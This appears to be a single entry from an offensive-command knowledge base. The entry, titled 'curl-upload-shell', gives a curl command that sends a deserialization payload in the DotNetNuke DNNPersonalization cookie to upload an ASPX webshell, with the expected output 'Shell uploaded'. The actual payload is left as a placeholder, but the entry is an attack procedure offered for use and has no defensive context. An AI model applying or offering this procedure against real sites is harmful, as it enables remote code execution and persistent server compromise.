---
id: uuid-placeholder-c5
data: >-
  curl -v "https://target.com/nonexistent-page" -H "Cookie:
  DNNPersonalization=<upload-xml>"
tags:
  - rce
  - webshell
type: command
output: |-
  HTTP/1.1 404
  Shell uploaded
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:54.194Z'
verified: false
validated: true
submitted: true
---
# curl-upload-shell

## Command

```bash
curl -v "https://target.com/nonexistent-page" -H "Cookie: DNNPersonalization=<upload-xml>"
```

## Description

Uploads ASPX webshell via deserialization payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H` | Upload payload | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: <createfile payload>" https://target.com/404
```

## Expected Output

Confirmation via no errors; access shell afterward.

## Related

- [[Related Procedure: Brute-Force-Writable-Paths-and-Upload-Webshell]]
